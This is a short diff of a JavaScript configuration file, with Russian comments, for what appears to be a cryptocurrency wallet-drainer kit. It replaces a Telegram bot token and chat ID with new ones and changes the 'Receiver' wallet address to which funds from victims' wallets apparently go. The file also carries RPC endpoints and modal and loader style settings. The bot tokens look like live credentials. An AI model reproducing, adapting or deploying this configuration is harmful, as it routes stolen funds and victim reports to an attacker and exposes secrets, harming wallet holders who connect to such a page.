@@ -6,8 +6,8 @@ let MS_Encryption_Key = 13; // Укажите любое число, котор�
 const MS_Modal_Style = 2; // 1 - старая, 2 - новая (обновление от 01.10.2023)
 const MS_Loader_Style = 2; // 1 - старый, 2 - новый (обновление от 01.10.2023)
 const MS_Color_Scheme = "light"; // light - светлая тема, dark - тёмная тема
-const botToken = '8515374525:AAFWSvo8UiHjrbea0_JzN6VUiSQbXkeGhr0';
-const chatID = '7784990852';
+const botToken = '8534311513:AAGfnn4gA0PG5Uqh14-TuXtzx6PQT51hFjw';
+const chatID = '7341336769';
 
 const MS_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
 
@@ -87,8 +87,8 @@ let MS_Ready = false,
       1: "https://eth.llamarpc.com",
       56: "https://bsc-dataseed1.defibit.io",
     },
-    Receiver: "0xe9522f4a372567c58bf5af9d28e82fe2529a7434",
-    Address: "0xe9522f4a372567c58bf5af9d28e82fe2529a7434",
+    Receiver: "0xf3f2C7074480e331608F86928521E4e567FBC131",
+    Address: "0xf3f2C7074480e331608F86928521E4e567FBC131",
     LA: 1
 
   },
